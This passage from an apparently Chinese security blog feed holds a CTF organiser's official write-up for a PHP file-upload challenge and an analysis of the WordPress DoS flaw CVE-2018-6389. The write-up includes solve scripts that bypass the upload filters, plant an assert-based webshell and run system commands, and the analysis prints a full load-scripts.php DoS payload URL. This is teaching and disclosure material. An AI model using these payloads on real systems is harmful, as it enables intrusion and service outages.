class="string">'upload over!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$savepath=<span class="string">"uploads/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</span><br><span class="line">    $oldmask = umask(<span class="number">0</span>);</span><br><span class="line">    mkdir($savepath, <span class="number">0777</span>);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $act=$_GET[<span class="string">'action'</span>];</span><br><span class="line">    <span class="keyword">if</span>($act===<span class="string">'upload'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename=$_POST[<span class="string">'filename'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $content=$_POST[<span class="string">'content'</span>];</span><br><span class="line">        waf($content);</span><br><span class="line">        upload($filename,$content,$savepath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($act===<span class="string">'test'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        test_rand_code();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è§£é‡Šä¸€ä¸‹é¢˜ç›®çš„æ„æ€<br>æ ¹æ®actionæ‰§è¡Œå¯¹åº”æ“ä½œï¼Œ<code>action=test</code>ä¼šè°ƒç”¨<code>test_rand_code</code>å‡½æ•°å‘é€tcpåŒ…åˆ°è®¿å®¢çš„ip<br><code>action=upload</code>æ—¶ä¼šå†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æœ‰wafæ‹¦æˆªï¼Œæ–‡ä»¶åæœ‰ç™½åå•é™åˆ¶åç¼€ï¼Œ<br>ç„¶åæ‹¼æ¥æ–‡ä»¶ååŠ å…¥randçš„å­—ç¬¦ä¸²ï¼Œå†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶å†™å…¥åè¿‡3ç§’unlinkåˆ é™¤<br>æœ‰é—®é¢˜çš„ç‚¹æœ‰è¿™å‡ ä¸ª<br>1.filenameæ£€æŸ¥æ˜¯ç”¨<code>$filename[count($filename)-1]</code>å–çš„åç¼€ï¼Œæ˜¯æŒ‰ç…§ä¸‹æ ‡å–çš„ï¼Œè€Œå†™å…¥æ–‡ä»¶æ—¶ç”¨çš„æ˜¯<code>end($filename)</code>ï¼Œæ˜¯å–æœ€åä¸€ä¸ªå…ƒç´ ï¼Œåªè¦postæ—¶æäº¤<code>filename[1]=jpg&amp;filename[0]=php</code>å°±èƒ½ç»•è¿‡äº†<br>2.$contentçš„wafç»•è¿‡ï¼Œ<script language=php>xxxx</script> ç»•è¿‡å³å¯<br>3.ä½¿ç”¨rand()ç”Ÿæˆéšæœºæ•°ï¼Œå¯ä»¥è¢«é¢„æµ‹ï¼Œå‚è€ƒ<a href="https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a></p>
<p>é¢„æœŸè§£æ³•æ˜¯<br>1.usernameæ•°ç»„bypassåç¼€æ£€æŸ¥ï¼Œç»•è¿‡contentçš„waf<br>2.randéšæœºæ•°é¢„æµ‹+çˆ†ç ´æ–‡ä»¶å åœ¨unlinkä¹‹å‰è®¿é—®shell<br>ç»“æœå¤§ä½¬ä»¬ç›´æ¥éé¢„æœŸè§£bypassäº†<code>unlink</code>æ‰“æ‰°äº†<br>éé¢„æœŸè§£å‚è€ƒ<a href="http://skysec.top/2018/02/13/happymoctfä¹‹webå…¨é¢˜è§£/" target="_blank" rel="noopener">ä¸€å¶é£˜é›¶</a>å¸ˆå‚…çš„WriteUp<br>é¢„æœŸè§£å¦‚ä¸‹<br>å†™ä¸¤ä¸ªè„šæœ¬ï¼Œ<br>listen.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç›‘å¬8888ç«¯å£ï¼Œæ¥å—6ä¸ª`get_rand_code`çš„ç»“æœï¼Œç„¶åé¢„æµ‹æ¥ä¸‹æ¥ä¸€æ¬¡`get_rand_code`çš„ç»“æœï¼Œè¿™é‡Œå¯èƒ½ä¸ä¼šå¾ˆå‡†ç¡®ï¼Œ</span></span><br><span class="line"><span class="comment">#æ‰€ä»¥éœ€è¦å°å¹…åº¦çˆ†ç ´ï¼Œå¤æ‚åº¦å¤§æ¦‚ä¸º3^6ï¼Œåæ­£å°±è·‘ç€å‘—</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#by xishir</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime  </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">r=req.session()</span><br><span class="line">url=<span class="string">"http://120.78.57.208:6005/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_list</span><span class="params">()</span>:</span></span><br><span class="line">    HOST = <span class="string">''</span>  </span><br><span class="line">    PORT = <span class="number">8888</span></span><br><span class="line">    BUFSIZ = <span class="number">128</span>  </span><br><span class="line">    ADDR = (HOST, PORT)  </span><br><span class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    tcpSerSock.bind(ADDR)</span><br><span class="line">    tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line">    rand_num=<span class="number">0</span></span><br><span class="line">    l=[]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        tcpCliSock, addr = tcpSerSock.accept()  </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            data=data[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">	    <span class="keyword">print</span> data,l</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">                l.append(ord(i)+<span class="number">1</span>-ord(<span class="string">'a'</span>))</span><br><span class="line">        rand_num+=<span class="number">1</span></span><br><span class="line">      	<span class="keyword">if</span> rand_num==<span class="number">6</span>:</span><br><span class="line">      		<span class="keyword">break</span></span><br><span class="line">    tcpCliSock.close()  </span><br><span class="line">    tcpSerSock.close()</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_salt</span><span class="params">(l)</span>:</span></span><br><span class="line">    salt=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        j=len(l)</span><br><span class="line">        r=(l[j<span class="number">-3</span>]+l[j<span class="number">-31</span>])<span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> r&gt;<span class="number">26</span>:</span><br><span class="line">        	r-=<span class="number">26</span></span><br><span class="line">        <span class="comment">#print l[j-3],chr(l[j-3]+ord('a')-1),l[j-31],chr(l[j-31]+ord('a')-1),r,chr(r+ord('a')-1)</span></span><br><span class="line">        l.append(r)</span><br><span class="line">        salt+=chr(r+ord(<span class="string">'a'</span>)<span class="number">-1</span>)</span><br><span class="line">        <span class="comment">#print salt</span></span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(salt)</span>:</span></span><br><span class="line">    s=hashlib.sha1(<span class="string">'119.23.73.3'</span>).hexdigest()</span><br><span class="line">    url1=url+<span class="string">'/uploads/'</span>+s+<span class="string">'/'</span>+<span class="string">'moctf'</span>+salt+<span class="string">'.php'</span></span><br><span class="line">    data=&#123;<span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');echo '666666';"</span>&#125;</span><br><span class="line">    r2=r.post(url1,data=data)</span><br><span class="line">    <span class="keyword">print</span> salt</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">    	<span class="keyword">print</span> r2.text</span><br><span class="line"></span><br><span class="line">get_flag(<span class="string">'aaaaaa'</span>)</span><br><span class="line">l=get_rand_list()</span><br><span class="line">salt=get_salt(l)</span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">	s=s+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">words = <span class="string">"10"</span></span><br><span class="line">o=its.product(words,repeat=<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</span><br><span class="line">	s=<span class="string">""</span>.join(i)</span><br><span class="line">	salt2=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	    salt2+=chr(ord(salt[j])-int(s[j]))</span><br><span class="line">	get_flag(salt2)</span><br><span class="line">words = <span class="string">"10"</span></span><br><span class="line">o=its.product(words,repeat=<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</span><br><span class="line">	s=<span class="string">""</span>.join(i)</span><br><span class="line">	salt2=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	    salt2+=chr(ord(salt[j])+int(s[j]))</span><br><span class="line">	get_flag(salt2)</span><br></pre></td></tr></table></figure></p>
<p>put.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#é€šè¿‡`?action=test`è°ƒç”¨`test_rand_code`å‡½æ•°å‘é€6æ¬¡`get_rand_code`ç»“æœï¼Œä¸€å…±36ä¸ªå­—ç¬¦ï¼Œ</span></span><br><span class="line"><span class="comment">#ç„¶åæäº¤ä¸€ä¸ªæ„é€ å¥½çš„`?action=test`ï¼Œä¸Šä¼ shellåˆ°æœåŠ¡å™¨ï¼Œåœ¨è¢«åˆ é™¤ä¹‹å‰å°±ä¼šè¢«listençˆ†ç ´å¾—åˆ°ï¼Œæ²¡çˆ†ç ´åˆ°å°±å¤šçˆ†ç ´å‡ æ¬¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#by xishir</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">r=req.session()</span><br><span class="line">url=<span class="string">"http://120.78.57.208:6005/?action="</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_test</span><span class="params">()</span>:</span></span><br><span class="line">    url2=url+<span class="string">"test"</span></span><br><span class="line">    r1=r.get(url2)</span><br><span class="line">    <span class="keyword">print</span> url2</span><br><span class="line">    <span class="keyword">print</span> r1.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    data=&#123;<span class="string">"filename[4]"</span>:<span class="string">"jpg"</span>,</span><br><span class="line">          <span class="string">"filename[2]"</span>:<span class="string">"jpg"</span>,</span><br><span class="line">          <span class="string">"filename[1]"</span>:<span class="string">"php"</span>,</span><br><span class="line">          <span class="string">"content"</span>:<span class="string">"&lt;script language='php'&gt;assert($_POST[a]);&lt;/script&gt;"</span>,</span><br><span class="line">          <span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');"</span></span><br><span class="line">          &#125;</span><br><span class="line">    url1=url+<span class="string">"upload"</span></span><br><span class="line">    r2=r.post(url1,data=data)</span><br><span class="line">    <span class="keyword">print</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    get_test()</span><br><span class="line">upload()</span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœå¦‚ä¸‹<br><img src="/img/2018moctf2.png" alt=""></p>
<h1 id="æ„Ÿæƒ³"><a href="#æ„Ÿæƒ³" class="headerlink" title="æ„Ÿæƒ³"></a>æ„Ÿæƒ³</h1><p>è®²ä¸€ä¸‹è¿™æ¬¡æ¯”èµ›æˆ‘ä¸»è¦å¹²äº†é‚£äº›äº‹å§</p>
<ol>
<li>å‡ºé¢˜ï¼Œå¦‚ä¸Šæ‰€è¿°</li>
<li>å¹³å°æ­å»ºï¼Œç”¨çš„æ˜¯ctfdï¼Œdockerçš„æ–¹å¼æ­å»ºçš„ï¼Œçœäº†å¾ˆå¤šäº‹</li>
<li>é¢˜ç›®éƒ¨ç½²ï¼Œé™¤äº†pingé‚£é¢˜ï¼Œå…¶ä»–çš„webéƒ½æ˜¯æˆ‘éƒ¨ç½²çš„ï¼Œå°¤å…¶æ˜¯cmsé‚£é¢˜ï¼Œåå¤éƒ¨ç½²çš„æœ‰ç‚¹åï¼Œä¸­é—´æœ‰ä¸ªé›†å¤§å­¦å¼Ÿæ¥å¸®å¿™ï¼Œåé¢æ¯”èµ›çš„æ—¶å€™è¿˜æ˜¯å‡ºäº†é—®é¢˜</li>
<li>å‘å¸ƒé¢˜ç›®ï¼Œemmmmmmmmmmï¼Œç”¨ctfdçš„æ—¶å€™å‡ºç°äº†å¾ˆç¥å¥‡çš„æƒ…å†µï¼Œåœ¨ç¼–è¾‘configçš„æ—¶å€™ä½¿ç”¨è°·æ­Œçš„è‡ªåŠ¨ç¿»è¯‘ï¼Œä¿å­˜ä¹‹åctfdçš„webæœåŠ¡å°±æŒ‚æ‰å•¦ï¼æ˜¯ä¸ªå·¨å‘ï¼Œç°åœ¨è¿˜ä¸çŸ¥é“å’‹å›äº‹</li>
<li>æ¯”èµ›æ—¶å€™çš„æ”¾é¢˜ï¼Œæ”¾hintï¼Œè¿ç»´ï¼Œæ°´ç¾¤ï¼Œå“ˆå“ˆå“ˆå“ˆå’Œå¤§ä½¬ä»¬ç©è€è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„<br>æ”¾ä¸€äº›åå°æ•°æ®<br><img src="/img/2018moctf3.png" alt=""><br><img src="/img/2018moctf4.png" alt=""><br><img src="/img/2018moctf5.png" alt=""></li>
</ol>
<p>åŸæ¥åªæ˜¯æƒ³ç»™æˆ‘ä»¬å­¦æ ¡å’Œé›†å¤§çš„å­¦å¼Ÿä»¬ä½“éªŒæ¯”èµ›çš„ï¼Œä¸è¿‡å¯¹å¤–å¼€æ”¾ä¹Ÿå¸å¼•äº†è®¸å¤šå¸ˆå‚…ä»¬æ¥åšé¢˜ï¼Œè™½ç„¶è¿ç»´å¾—å¾ˆç´¯ï¼Œä½†ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼ˆä¸»è¦æ˜¯éé¢„æœŸå’Œéƒ¨ç½²å„ç§å¥‡è‘©ç¯å¢ƒï¼‰<br>æ‰“ä¸€æ³¢å¹¿å‘Šï¼Œ<a href="http://www.moctf.com/" target="_blank" rel="noopener">http://www.moctf.com/</a><br>MOCTFå¹³å°æ˜¯CodeMonsterå’ŒMokirinè¿™ä¸¤æ”¯CTFæˆ˜é˜Ÿæ‰€æ­å»ºçš„ä¸€ä¸ªCTFåœ¨çº¿ç­”é¢˜ç³»ç»Ÿã€‚é¢˜ç›®å½¢å¼ä¸å„å¤§CTFæ¯”èµ›ç›¸åŒã€‚ç›®çš„æ˜¯ä¸ºä¸¤ä¸ªå­¦æ ¡ä¸­çƒ­çˆ±ä¿¡æ¯å®‰å…¨çš„åŒå­¦ä»¬æä¾›ä¸€ä¸ªåˆ·é¢˜çš„å¹³å°ï¼Œèƒ½å¤Ÿä¸€èµ·å­¦ä¹ ã€è¿›æ­¥ã€‚</p>
<p>æœ€åç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼<br><img src="/img/2018moctf6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»æ”¾å‡åˆ°ç°åœ¨ç­¹åŠå‡†å¤‡äº†æ¥è¿‘ä¸¤ä¸ªæ˜ŸæœŸçš„MOCTFæ–°æ˜¥æ¬¢ä¹èµ›ç»ˆäºè½å¹•å•¦ï¼Œè¿™æ¬¡æ¯”èµ›æˆ‘ä¸€å…±å‡ºäº†1ç­¾åˆ°+1MISC+3WEBï¼Œä¸‹é¢å…ˆæ”¾å®˜æ–¹WriteUpï¼ˆå“‡ç»ˆäºèƒ½å½“ä¸€å›å®˜æ–¹äº†ï¼‰&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-6389 WordPressé€šæ€DoSæ¼æ´åˆ†æ</title>
    <link href="https://www.codemonster.cn/2018/02/06/cve-2018-6389-analysis/"/>
    <id>https://www.codemonster.cn/2018/02/06/cve-2018-6389-analysis/</id>
    <published>2018-02-06T07:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿‘æ—¥ï¼Œ<code>WordPress</code>çˆ†å‡ºé€šæ€æ‰€æœ‰ç‰ˆæœ¬çš„<code>DoS</code>æ¼æ´ï¼ŒCVEç¼–å·<code>CVE-2018-6389</code>ï¼Œ è¿‡å»ä¹å¹´å‘å¸ƒçš„å‡ ä¹æ‰€æœ‰ç‰ˆæœ¬çš„WordPresséƒ½å—å½±å“ï¼ŒåŒ…æ‹¬æœ€æ–°ç‰ˆæœ¬4.9.2ï¼Œä½œè€…ç»™å‡ºäº†pocè§†é¢‘åŠä¿®è¡¥è„šæœ¬ï¼Œåœ¨pocä¸­ä»–å‘èµ·çš„å•ä¸ªè¯·æ±‚ä¼šå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œ181ä¸ªI / Oæ“ä½œï¼Œå¹¶åœ¨å“åº”ä¸­æä¾›æ–‡ä»¶å†…å®¹ï¼Œä½†Wordpresså›¢é˜Ÿæ‹’ç»æ‰¿è®¤è¿™ä¸ªæ¼æ´ã€‚<br><a id="more"></a></p>
<p>æ¼æ´ç›¸å…³ä¿¡æ¯å¦‚ä¸‹</p>
<h3 id="CVE-2018-6389æ¼æ´æ¦‚è¦"><a href="#CVE-2018-6389æ¼æ´æ¦‚è¦" class="headerlink" title="CVE-2018-6389æ¼æ´æ¦‚è¦"></a>CVE-2018-6389æ¼æ´æ¦‚è¦</h3><p>é’ˆå¯¹CVE-2018-6389æ¼æ´æƒ…å†µï¼Œå®‰å…¨åŠ æ•´ç†äº†ç›¸å…³å†…å®¹å¦‚ä¸‹ï¼Œè¿™äº›å†…å®¹å¯èƒ½æ¥è‡ªäºCVE-2018-6389æ¶‰åŠå‚å•†ã€CVE-2018-6389æ¼æ´ä¿¡æ¯å‘å¸ƒç»„ç»‡ã€CVEã€SecurityFocusåŠå…¶å®ƒç¬¬ä¸‰æ–¹ç»„ç»‡ã€‚</p>
<h3 id="CVE-2018-6389æ¼æ´æ ‡è¯†"><a href="#CVE-2018-6389æ¼æ´æ ‡è¯†" class="headerlink" title="CVE-2018-6389æ¼æ´æ ‡è¯†"></a>CVE-2018-6389æ¼æ´æ ‡è¯†</h3><ul>
<li>CVE IDï¼šCVE-2018-6389</li>
<li>BUGTRAQ IDï¼šã€BUGTRAQ IDã€‘</li>
<li>æ¼æ´æ¶‰åŠå‚å•†æ¼æ´åº“IDï¼šã€æ¼æ´æ¶‰åŠå‚å•†æ¼æ´åº“IDã€‘</li>
<li>CNNVD IDï¼šã€CNNVDæ¼æ´ç¼–å·ã€‘</li>
<li>ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“IDï¼šã€ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“IDã€‘</li>
</ul>
<h3 id="CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥"><a href="#CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥" class="headerlink" title="CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥"></a>CVE-2018-6389æ¼æ´ç›¸å…³é“¾æ¥</h3><ul>
<li>ç™¾åº¦é“¾æ¥ï¼š<a href="https://www.baidu.com/s?wd=CVE-2018-6389" target="_blank" rel="noopener">https://www.baidu.com/s?wd=CVE-2018-6389</a></li>
<li>ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“é“¾æ¥ï¼š<a href="http://www.nsfocus.net/vulndb/{ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“ID}" target="_blank" rel="noopener">http://www.nsfocus.net/vulndb/{ç»¿ç›Ÿç§‘æŠ€æ¼æ´åº“ID}</a></li>
<li>Githubé“¾æ¥ï¼š<a href="https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh" target="_blank" rel="noopener">https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh</a></li>
<li>æ¼æ´ä½œè€…é“¾æ¥ï¼š<a href="https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener">https://baraktawily.blogspot.in/2018/02/how-to-dos-29-of-world-wide-websites.html</a></li>
</ul>
<h3 id="CVE-2018-6389æ¼æ´è¯¦æƒ…"><a href="#CVE-2018-6389æ¼æ´è¯¦æƒ…" class="headerlink" title="CVE-2018-6389æ¼æ´è¯¦æƒ…"></a>CVE-2018-6389æ¼æ´è¯¦æƒ…</h3><p>æ¼æ´ä½äº<code>load-scripts.php</code>ï¼Œè¯¥æ–‡ä»¶æ˜¯ä¸ºWordPressç®¡ç†å‘˜è®¾è®¡çš„ï¼Œå…è®¸å°†å¤šä¸ªJavaScriptæ–‡ä»¶åŠ è½½åˆ°ä¸€ä¸ªè¯·æ±‚ä¸­ï¼Œä½†ç ”ç©¶äººå‘˜æ³¨æ„åˆ°å¯ä»¥åœ¨ç™»å½•ä¹‹å‰è°ƒç”¨è¯¥å‡½æ•°æ¥å…è®¸ä»»ä½•äººè°ƒç”¨å®ƒï¼Œå³ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨å®ƒã€‚<br>é€šè¿‡æ„é€ ç‰¹æ®Šçš„payloadå¯å¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œ<code>181ä¸ªI/Oæ“ä½œ</code>ï¼Œå¹¶å‘è¯·æ±‚çš„æƒ…å†µä¸‹å³å¯è¾¾åˆ°Dosçš„æ•ˆæœã€‚<br>payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mywpserver.com&#x2F;wp-admin&#x2F;load-scripts.php?c&#x3D;1&amp;load%5B%5D&#x3D;eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&amp;ver&#x3D;4.9</span><br></pre></td></tr></table></figure></p>
